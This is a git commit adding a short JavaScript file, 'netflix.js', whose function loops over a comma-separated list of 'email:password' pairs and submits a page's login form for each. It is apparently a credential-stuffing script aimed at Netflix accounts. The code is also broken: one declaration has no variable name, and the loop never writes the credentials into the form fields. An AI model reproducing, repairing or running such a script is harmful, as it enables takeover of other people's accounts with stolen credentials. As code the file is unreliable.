5e4a838662d481adc11d61035ec0112b9ae23381
deli0s <info.delios@gmail.com>
2017-04-05 01:24:57 +0200

    Create netflix.js

---
+++ netflix.js
@@ -0,0 +1,19 @@
+function log(_array){
+	var =_array.split(',');
+	var size=u_p.length;
+	var i=0;
+	var email=document.getElementsByTagName("input")[0].value;
+	var pass=document.getElementsByTagName("input")[1].value;
+	while (i<size && existeix(email) && existeix(pass)){
+		var _up=u_p[i].split(':');
+		var u=_up[0];
+		var p=_up[1];
+		email=u;
+		pass=p;
+		document.getElementsByTagName("form")[0].submit();
+		i++;
+	}
+}
+function existeix(nom){
+	return (nom!==undefined && nom!==null);
+}
